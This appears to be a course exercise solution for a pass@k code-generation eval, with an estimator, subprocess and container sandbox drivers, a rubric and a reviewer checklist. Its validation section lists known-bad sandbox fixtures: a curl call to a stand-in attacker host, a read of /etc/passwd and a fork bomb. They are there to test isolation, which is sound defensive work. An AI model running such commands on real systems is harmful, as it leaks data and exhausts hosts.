# exercise-01 — pass@k with Sandbox Execution — Solution

## 1. Solution overview

The exercise asks the learner to build a **code-generation eval** whose headline metric is `pass@k`, computed from samples whose correctness is decided by **executing** the candidate against a fixed test harness in a **sandbox**. Two things have to be right at once:

- The **metric** has to be the unbiased estimator of pass@k, not the naive "1 if any of k samples passes" formula. The naive formula over-reports when you sample `n > k` and sub-sample.
- The **execution environment** has to be a security-relevant artifact. A code eval that runs candidate code in the same interpreter that holds the test harness is not a benchmark; it is a remote code execution surface the moment a candidate writes `os.system`.

The reference answer has five deliverables:

1. A **problem / test harness schema** — one JSONL row per problem with a prompt, a reference solution, a public test suite (shown to the model as part of the prompt if the eval allows it), and a hidden test suite (used only at scoring time).
2. An **unbiased pass@k estimator** — the Chen et al. formula implemented as a short, tested function, not re-derived per run.
3. A **sandboxed execution driver** — subprocess-with-limits for development, container-with-no-network for CI, documented tradeoffs between the two.
4. A **run manifest** — exact model id, decoding config, `n`, `k` values, sandbox image digest, seed, and the exact `eval` command; a result row another engineer can reproduce.
5. A **review checklist** that treats "ran the eval" and "ran the eval safely" as separate gates — a pass@k number produced inside a leaky sandbox is neither credible nor safe to report.

This maps to the NIST AI RMF `MEASURE` function, which asks that metrics be "tested, documented, and tied to an identified operational context" ([NIST AI RMF](https://www.nist.gov/itl/ai-risk-management-framework)) — an estimator used from memory and a sandbox configured by vibes fail that bar in different ways. The adversarial lens is OWASP ML Top 10 **ML06 Corrupted Packages** (a candidate can `pip install` arbitrary code if the sandbox allows egress) and the broader supply-chain and runtime risks ([OWASP ML Top 10](https://owasp.org/www-project-machine-learning-security-top-10/)). MITRE ATLAS names the technique explicitly: `Execution: User Execution` and `Execution: Command and Scripting Interpreter` are exactly what a code eval is doing on every sample ([MITRE ATLAS](https://atlas.mitre.org/)); a sandbox that lets a candidate reach a shell or the network has moved the eval from measurement into a live attack surface.

## 2. Worked implementation

### 2.1 Directory layout

```
code_eval/
  README.md
  problems/
    mini_py_v1.jsonl             # 20 problems, committed
    checksums.sha256
  harness/
    __init__.py
    estimator.py                 # pass@k estimator + tests
    sandbox_subprocess.py        # development sandbox
    sandbox_container.py         # CI sandbox (docker / podman driver)
    runner.py                    # reads JSONL, samples completions, scores
  reproduction/
    run_2026-11-20.yaml          # manifest: model, seed, sandbox digest, counts
  tests/
    test_estimator.py
    test_sandbox_subprocess.py
```

Rule: **problems, test suites, and the sandbox image digest are committed**. A code eval whose problems or sandbox can silently change between runs is not a benchmark; it is a weather report.

### 2.2 Problem schema

Each row is one JSON object:

```json
{
  "id": "mpy-00007",
  "language": "python",
  "prompt": "def running_max(xs):\n    \"\"\"Return a list of the running maxima of xs.\n    Examples:\n      >>> running_max([1,3,2,5,4])\n      [1, 3, 3, 5, 5]\n    \"\"\"\n",
  "entry_point": "running_max",
  "public_tests": [
    {"input": "[1,3,2,5,4]", "output": "[1,3,3,5,5]"},
    {"input": "[]",          "output": "[]"}
  ],
  "hidden_tests": [
    {"input": "[5,5,5]",                       "output": "[5,5,5]"},
    {"input": "[-1,-3,-2,-5,-4]",              "output": "[-1,-1,-1,-1,-1]"},
    {"input": "list(range(1000, -1, -1))",     "output": "[1000]*1001"}
  ],
  "time_limit_s": 2.0,
  "memory_limit_mb": 256,
  "license": "cc-by-4.0",
  "provenance": "authored for exercise-01; not from HumanEval/MBPP"
}
```

Three invariants to enforce in CI (section 3):

- `public_tests` are allowed in the prompt; `hidden_tests` are **never** in the prompt or in the training-time context of any model this eval is used to compare. If they leak, the metric measures recall of the leak, not code generation.
- The reference solution — if committed — must itself pass every `public_test` and every `hidden_test` under the committed sandbox and time limit. A reference solution that only passes under laxer limits means the limits are wrong (or the reference is wrong).
- `provenance` and `license` are per-problem. A benchmark that pulls problems from mixed-license sources without tagging will fail procurement review the first time it is published.

### 2.3 Unbiased pass@k estimator

The naive estimator — "1 if any of the first k samples passes, else 0" — is biased upward when you sample `n` completions and compute pass@k for `k < n`, because you are effectively drawing without replacement from a biased sample. The HumanEval paper (Chen et al., 2021) uses the unbiased combinatorial form:

```
pass@k = E_problem [ 1 - C(n - c, k) / C(n, k) ]
```

where `n` is the number of samples drawn per problem, `c` is the number of correct samples among the `n`, and `C(a, b)` is the binomial coefficient (with `C(a, b) = 0` when `a < b`). When `c >= n - k + 1` the second term is zero and the problem contributes 1.

Implementation (`harness/estimator.py`):

```python
"""Unbiased pass@k estimator for code generation evals."""

from __future__ import annotations

from math import comb
from statistics import mean


def pass_at_k_one(n: int, c: int, k: int) -> float:
    """Unbiased pass@k for a single problem.

    n: total samples drawn
    c: samples that passed the hidden test suite
    k: the k in pass@k; must satisfy 1 <= k <= n
    """
    if not (1 <= k <= n):
        raise ValueError(f"require 1 <= k <= n, got k={k}, n={n}")
    if not (0 <= c <= n):
        raise ValueError(f"require 0 <= c <= n, got c={c}, n={n}")
    if n - c < k:
        return 1.0
    return 1.0 - comb(n - c, k) / comb(n, k)


def pass_at_k(results_per_problem: list[tuple[int, int]], k: int) -> float:
    """Unbiased pass@k averaged over problems.

    results_per_problem: list of (n, c) tuples, one per problem.
    """
    return mean(pass_at_k_one(n, c, k) for (n, c) in results_per_problem)
```

Tests (`tests/test_estimator.py`) pin the properties, not the implementation:

```python
from math import comb
from harness.estimator import pass_at_k_one

def test_all_correct_is_one():
    assert pass_at_k_one(n=10, c=10, k=1) == 1.0
    assert pass_at_k_one(n=10, c=10, k=5) == 1.0

def test_all_wrong_is_zero():
    assert pass_at_k_one(n=10, c=0, k=1) == 0.0
    assert pass_at_k_one(n=10, c=0, k=5) == 0.0

def test_single_correct_matches_naive_for_k_eq_n():
    # pass@n with any c >= 1 is 1.0
    assert pass_at_k_one(n=5, c=1, k=5) == 1.0

def test_k_equals_one_matches_sample_mean():
    # pass@1 = c / n, the sample mean
    assert pass_at_k_one(n=10, c=3, k=1) == 0.3

def test_matches_closed_form():
    # spot-check the combinatorial form directly
    n, c, k = 20, 4, 5
    expected = 1 - comb(n - c, k) / comb(n, k)
    assert abs(pass_at_k_one(n, c, k) - expected) < 1e-12
```

One rule to enforce in review: **never compare pass@k numbers across evals that used different `n`**. The estimator is unbiased for a given `n`, but variance drops with `n`; a `pass@1` from `n=10` and a `pass@1` from `n=1` are not interchangeable even though both are "unbiased."

### 2.4 Sandboxed execution driver

Two sandboxes, one interface. Development uses subprocess-with-limits for speed; CI uses a container with no network and a committed image digest.

#### Subprocess sandbox (`harness/sandbox_subprocess.py`)

Suitable for local development only. The guarantee is "contained within reason" — it cannot contain a candidate that reaches out to the network or escapes the file system without an OS-level jail.

```python
"""Subprocess sandbox: resource limits + timeout + tempdir cwd.

NOT a security boundary. Use the container driver in CI and anywhere a
candidate's output could be untrusted."""

from __future__ import annotations

import os
import resource
import subprocess
import tempfile
from dataclasses import dataclass


@dataclass
class ExecResult:
    passed: bool
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool


def _set_limits(mem_mb: int) -> None:
    # Called in the child between fork and exec on POSIX. Does not run on
    # Windows; use the container driver there.
    mem_bytes = mem_mb * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
    resource.setrlimit(resource.RLIMIT_CPU, (10, 10))
    resource.setrlimit(resource.RLIMIT_NOFILE, (64, 64))
    # Deny core dumps to avoid filling disk on crash loops.
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def run(
    candidate_code: str,
    test_driver: str,
    *,
    time_limit_s: float,
    memory_limit_mb: int,
) -> ExecResult:
    """Run candidate_code and test_driver in a disposable tempdir.

    test_driver is appended after candidate_code in a single file; it must
    exit 0 on pass and non-zero on fail.
    """
    with tempfile.TemporaryDirectory(prefix="codeeval-") as tmpdir:
        src = os.path.join(tmpdir, "run.py")
        with open(src, "w", encoding="utf-8") as f:
            f.write(candidate_code)
            f.write("\n\n# --- harness ---\n")
            f.write(test_driver)
        try:
            proc = subprocess.run(
                ["python3", "-I", src],   # -I: isolated, no user site, no env PYTHON*
                capture_output=True,
                text=True,
                timeout=time_limit_s,
                cwd=tmpdir,
                env={"PATH": "/usr/bin:/bin"},  # minimal env
                preexec_fn=lambda: _set_limits(memory_limit_mb),
            )
            return ExecResult(
                passed=(proc.returncode == 0),
                exit_code=proc.returncode,
                stdout=proc.stdout[-4096:],
                stderr=proc.stderr[-4096:],
                timed_out=False,
            )
        except subprocess.TimeoutExpired as e:
            return ExecResult(
                passed=False,
                exit_code=None,
                stdout=(e.stdout or b"").decode(errors="replace")[-4096:],
                stderr=(e.stderr or b"").decode(errors="replace")[-4096:],
                timed_out=True,
            )
```

What this driver gives you:

- A fresh `TemporaryDirectory` as the cwd per candidate — no shared state across samples.
- `python3 -I` (isolated) — ignores `PYTHONPATH`, user site-packages, and `PYTHON*` env vars, so the candidate cannot import whatever is on the harness operator's PATH.
- `RLIMIT_AS` / `RLIMIT_CPU` / `RLIMIT_NOFILE` — a runaway loop or fork-bomb attempt fails loudly instead of eating the host.
- A minimal `env` with just `PATH` — the candidate does not see the operator's secrets.

What this driver **does not** give you:

- Network isolation. A candidate can `import socket` and talk to the internet; it can `urllib.request.urlopen(...)`. For CI, you need the container driver.
- File-system isolation beyond cwd. A candidate can read `/etc/passwd`, your `~/.ssh`, or `$HOME`. For CI, you need the container driver.
- Protection against deliberate escape attempts (`ctypes` to `libc`, `/proc/self/mem`, etc.).

Write these limitations in `harness/sandbox_subprocess.py`'s docstring and in the repo README, next to the driver import. The "sandbox" word is load-bearing; a reader who assumes it means a security boundary will deploy this in prod.

#### Container sandbox (`harness/sandbox_container.py`)

```python
"""Container sandbox: docker/podman run with no network, read-only FS, pinned digest.

Use this in CI and anywhere a candidate's output could be untrusted."""

from __future__ import annotations

import json
import os
import subprocess
from dataclasses import dataclass

# Pin by digest, not tag. A :latest tag is a moving target.
SANDBOX_IMAGE = "ghcr.io/example/code-eval-python@sha256:<pinned-digest>"


@dataclass
class ExecResult:
    passed: bool
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool


def run(
    candidate_code: str,
    test_driver: str,
    *,
    time_limit_s: float,
    memory_limit_mb: int,
    runtime: str = "docker",
) -> ExecResult:
    payload = json.dumps(
        {"candidate": candidate_code, "driver": test_driver}
    ).encode("utf-8")
    cmd = [
        runtime, "run",
        "--rm",
        "--network=none",                  # no egress, no DNS
        "--read-only",                     # root FS is RO
        "--tmpfs", "/tmp:size=64m,exec",   # scratch space
        "--cap-drop=ALL",                  # drop every capability
        "--security-opt=no-new-privileges",
        f"--memory={memory_limit_mb}m",
        f"--memory-swap={memory_limit_mb}m",
        "--cpus=1",
        "--pids-limit=64",
        "-i",                              # stdin
        SANDBOX_IMAGE,
        "python3", "-I", "/opt/eval/run_one.py",
    ]
    try:
        proc = subprocess.run(
            cmd,
            input=payload,
            capture_output=True,
            timeout=time_limit_s + 5.0,  # outer timeout > inner
        )
        return ExecResult(
            passed=(proc.returncode == 0),
            exit_code=proc.returncode,
            stdout=proc.stdout.decode(errors="replace")[-4096:],
            stderr=proc.stderr.decode(errors="replace")[-4096:],
            timed_out=False,
        )
    except subprocess.TimeoutExpired as e:
        return ExecResult(
            passed=False,
            exit_code=None,
            stdout=(e.stdout or b"").decode(errors="replace")[-4096:],
            stderr=(e.stderr or b"").decode(errors="replace")[-4096:],
            timed_out=True,
        )
```

Everything on the `docker run` command line is load-bearing:

- `--network=none`: no DNS, no sockets to the outside. Blocks `pip install`, blocks data exfiltration, blocks "candidate code calls an API for the answer."
- `--read-only` plus a small `tmpfs`: the candidate cannot persist anything across runs or poison the next sample.
- `--cap-drop=ALL --security-opt=no-new-privileges`: the candidate cannot escalate within the container.
- `--memory` with `--memory-swap` equal to `--memory`: a classic OOM-via-swap is denied.
- `--cpus=1 --pids-limit=64`: a fork bomb exhausts a limit, not the host.
- `SANDBOX_IMAGE` pinned by `@sha256:...`: a tag is a moving target; a digest is not. This is the ML supply-chain gate — it is the single most important line in the file.

A small `/opt/eval/run_one.py` inside the image reads `{"candidate": ..., "driver": ...}` from stdin, concatenates and executes in a child process with its own `resource` limits, and exits 0 / non-zero.

### 2.5 Runner (`harness/runner.py`)

Sketch — the glue that reads problems, calls the model, scores with a sandbox, aggregates with the estimator:

```python
from harness.estimator import pass_at_k
from harness.sandbox_container import run as sandbox_run

def score_one_problem(problem, model_samples):
    c = 0
    for sample in model_samples:
        driver = build_test_driver(problem)          # concat public + hidden tests
        res = sandbox_run(
            candidate_code=sample,
            test_driver=driver,
            time_limit_s=problem["time_limit_s"],
            memory_limit_mb=problem["memory_limit_mb"],
        )
        if res.passed:
            c += 1
    return len(model_samples), c

def run_eval(problems, k_list, n, sample_fn):
    per_problem = []
    for p in problems:
        samples = sample_fn(p["prompt"], n=n)         # n samples per problem
        per_problem.append(score_one_problem(p, samples))
    return {f"pass@{k}": pass_at_k(per_problem, k) for k in k_list}
```

Two rules the runner must enforce:

- **Sample once, score many.** The samples are saved before scoring, not regenerated when you compute pass@k for a new `k`. That means you can retroactively compute pass@1, pass@5, pass@10 from the same `n=10` draw — comparable because the samples are the same.
- **Hidden tests never appear in the prompt.** The runner constructs `prompt_for_model` using the problem's `prompt` and `public_tests`, and constructs the `test_driver` using every test; the two code paths are separated so a careless refactor cannot merge them.

### 2.6 Reproduction manifest

Commit `reproduction/run_2026-11-20.yaml` next to the results:

```yaml
run_id: mini_py_v1_opus-4-7_n10_2026-11-20
problem_set: mini_py_v1
problem_set_sha256: <sha256 of problems/mini_py_v1.jsonl>
harness_commit: <git sha of this repo>
sandbox_image: ghcr.io/example/code-eval-python@sha256:<pinned-digest>
sandbox_driver: container
runtime: docker
model:
  id: claude-opus-4-7
  decoding:
    temperature: 0.8
    top_p: 1.0
    max_tokens: 512
    stop: ["\nclass ", "\ndef "]
n: 10
k_list: [1, 5, 10]
seed: 20261120
cli: "python -m harness.runner --problems problems/mini_py_v1.jsonl --n 10 --k 1,5,10 --model claude-opus-4-7 --seed 20261120"
results:
  pass@1:  0.42
  pass@5:  0.71
  pass@10: 0.84
```

A reviewer who shows up three months later can rerun the same CLI against the pinned image digest and the pinned problem set and get the same samples given the same model and seed. The three `pass@k` numbers are tied to one `n`; it is a category error to mix them with a run at a different `n`.

## 3. Validation steps

1. **Estimator properties.** `test_estimator.py` covers `pass@k(c=0)=0`, `pass@k(c=n)=1`, `pass@1 = c/n`, and a closed-form spot check. Any change to `estimator.py` must keep every property.
2. **Reference solution passes the harness.** For every problem, the committed reference solution runs under the committed sandbox and time limit and passes every `public_test` and every `hidden_test`. If it does not, either the reference is wrong or the limits are. CI fails on red.
3. **No test leakage.** A script walks every problem and asserts that no `hidden_test.input` or `hidden_test.output` string appears as a substring of the problem's `prompt`. The prompt-construction code and the driver-construction code live in different functions; reviewing a PR touching one does not require trusting the other.
4. **Problem checksums.** `problems/checksums.sha256` is regenerated by CI and compared against the committed file. Silent data drift is the single biggest reason a benchmark number ceases to be comparable across runs.
5. **Sandbox integration tests.** A small set of "known-bad" candidates lives in `tests/sandbox_fixtures/` — one that tries `import os; os.system('curl http://attacker/')`, one that tries `open('/etc/passwd')`, one that forks until it runs out of PIDs, one that allocates 10 GB. The container driver is asserted to return `passed=False` on every one and to exit within `time_limit_s + 5`.
6. **Image digest pin.** The sandbox image is referenced by `@sha256:...`. CI rejects a PR that introduces a `:tag` form. The digest is updated via an intentional, reviewed PR, not a silent rebuild.
7. **Deterministic sample-and-score.** With `seed=20261120`, `n=10` samples per problem produce the same sampled completions on reruns against the same model endpoint. The sandbox verdicts are deterministic given the same samples and image digest; two independent CI runs produce the same (n, c) per problem, hence the same `pass@k`.
8. **Manifest completeness.** The manifest has a non-empty value for `harness_commit`, `sandbox_image` (with a digest), `model.id`, `n`, `k_list`, `seed`, and `cli`. CI rejects a missing field — a run whose model id is blank is not reproducible.

## 4. Rubric or review checklist

Scored out of 10. The rubric rewards the artifact being **a controlled, auditable benchmark that runs safely in CI**, not a one-off local script.

| # | Criterion | Points | Passing evidence |
|---|---|---|---|
| R1 | Problems, public/hidden tests, and limits are committed JSONL with checksums | 2 | `problems/mini_py_v1.jsonl` + `checksums.sha256`; CI verifies. |
| R2 | pass@k uses the unbiased combinatorial estimator with tests | 2 | `estimator.py` implements the Chen et al. formula; properties are pinned in `test_estimator.py`. |
| R3 | Sampling is done once; multiple `k` values are computed from the same `n` draw | 1 | Samples are persisted; reruns for new `k` do not re-query the model. |
| R4 | Hidden tests are never in the model prompt | 1 | Prompt-build and driver-build are separate functions; CI checks no `hidden_test` substring appears in any prompt. |
| R5 | Development sandbox has resource limits, isolated env, and documented caveats | 1 | `sandbox_subprocess.py` uses `RLIMIT_*`, `python3 -I`, a minimal `env`, and a docstring saying "not a security boundary". |
| R6 | CI sandbox denies egress, drops capabilities, and pins image by digest | 2 | `sandbox_container.py` uses `--network=none`, `--cap-drop=ALL`, `--read-only`, `--pids-limit`, and a `@sha256:...` image. |
| R7 | Reproduction manifest captures model, decoding, seed, sandbox digest, and CLI | 1 | `reproduction/*.yaml`; each result row references a manifest file. |

**Passing bar:** 7 / 10. R6 and R2 are non-negotiable — without the unbiased estimator the number is wrong; without the container limits the eval is a live attack surface.

Reviewer checklist:

- [ ] `pass@1` equals `c/n` as a sanity check on the estimator.
- [ ] Tests cover `c=0`, `c=n`, and a non-trivial closed-form case.
- [ ] Reference solutions pass every public and hidden test under committed limits.
- [ ] `problems/checksums.sha256` matches the on-disk JSONL.
- [ ] Container run uses `--network=none`, `--read-only`, `--cap-drop=ALL`, `--memory`, `--pids-limit`.
- [ ] Image is pinned by digest, not tag.
- [ ] A "known-bad" network candidate is scored `passed=False` and does not reach the internet.
- [ ] The manifest has `harness_commit`, `sandbox_image`, `model.id`, `n`, `k_list`, `seed`, `cli`; result tables cite the manifest id.
- [ ] Reported `pass@k` numbers across runs are only compared when `n` matches.

## 5. Common mistakes

- **Naive pass@k.** "1 if any of the k samples passes" is biased upward when you sample `n > k` and sub-sample. Use the Chen et al. combinatorial estimator; comparing a biased number to a published unbiased one makes the biased run look better than it is.
- **`n=1` reported as `pass@1`.** `pass@1` at `n=1` is a single coin flip per problem. The number is unbiased but high-variance; two such runs can differ by double-digit points on small problem sets. Use `n >= 10` for `pass@1` unless the model is deterministic at the decoding settings used.
- **Resampling for each `k`.** Drawing a fresh `n=k` sample per `k` makes the `pass@k` values incomparable with each other and inflates cost. Sample once with `n = max(k_list)`; score all; compute every `k` from the same draw.
- **Hidden tests leaked into the prompt.** A refactor that unifies `prompt_from_problem` and `tests_from_problem` into one function eventually shows hidden tests to the model. Keep them in separate call paths; add a CI check.
- **Trusting `subprocess.run(timeout=...)` as a sandbox.** It is a timeout, not an isolation. A candidate with `import socket` or `urllib` still reaches the network from inside `subprocess.run`. Use the container driver in CI.
- **Pulling the sandbox image by tag.** `python:3.12` moves; `python:3.12-slim` moves; even `python:3.12.4-slim-bookworm` moves on security refreshes. Pin by `@sha256:...`.
- **Allowing network in the sandbox for "convenience."** A candidate can `pip install` arbitrary packages; a candidate can call an LLM's API; a candidate can exfiltrate the hidden test suite if it reads any file. The gate is `--network=none`.
- **Container runs with `--privileged` or without `--cap-drop=ALL`.** The whole point of the container was isolation. Dropping capabilities and `no-new-privileges` costs nothing and is the difference between "measurement" and "RCE".
- **Not persisting samples.** Only the aggregate score is saved. A bug in the test driver is discovered next week and every rescore requires re-querying the model (different samples, different number). Persist samples (gzip'd JSONL by problem id) so scoring is pure.
- **Letting `pip install` happen at runtime inside the sandbox.** Even with `--network=none`, a candidate that calls `pip` eats time and produces confusing stderr. Pre-install the exact dependency set in the image; the image digest is the dependency pin.
- **Mixing problems from incompatible licenses.** Pulling problems from GitHub repos without tagging per-problem licenses gets the eval pulled from distribution the moment someone reads the headers. Tag `license` and `provenance` per problem.

## 6. References

- NIST AI Risk Management Framework — <https://www.nist.gov/itl/ai-risk-management-framework>. The `MEASURE` function requires metrics and their test harness to be tested, documented, and tied to an operational context; the pinned problem set, pinned sandbox digest, and reproduction manifest are the direct operationalization for a code-generation eval.
- OWASP Machine Learning Security Top 10 — <https://owasp.org/www-project-machine-learning-security-top-10/>. **ML06 Corrupted Packages** is the risk a sandbox with network egress and a floating base image accepts on every run; `--network=none` plus a digest-pinned image is the direct mitigation.
- MITRE ATLAS — <https://atlas.mitre.org/>. `User Execution` and `Command and Scripting Interpreter` describe what a code eval is doing on every sample; without a container-level jail, the eval harness becomes exactly the execution surface those techniques target.

<!-- Local exercise context: the `mini_py_v1` problem set, the specific limits (2 s per problem, 256 MB, 64 open files, `--pids-limit=64`, 20-item dev set), the `ghcr.io/example/code-eval-python` image name, and the YAML field names in the reproduction manifest are illustrative defaults for a small Python-only code eval. Rewrite them for the target language, problem count, and risk profile of your own eval before adopting. Math-style benchmarks whose answer is a single value (not executable code) are the subject of [exercise-02](../exercise-02-math-eval-with-robust-extraction/SOLUTION.md); RAG evals that score an answer against a retrieved context are covered in [exercise-03](../exercise-03-rag-eval-with-ragas-and-trulens/SOLUTION.md); the multimodal / visual eval cases are covered in [exercise-04](../exercise-04-multimodal-vqa-and-grounding-eval/SOLUTION.md); the end-to-end eval suite that bundles code, math, RAG, and multimodal under one product harness is the subject of [exercise-05](../exercise-05-product-shaped-eval-suite-design/SOLUTION.md). -->
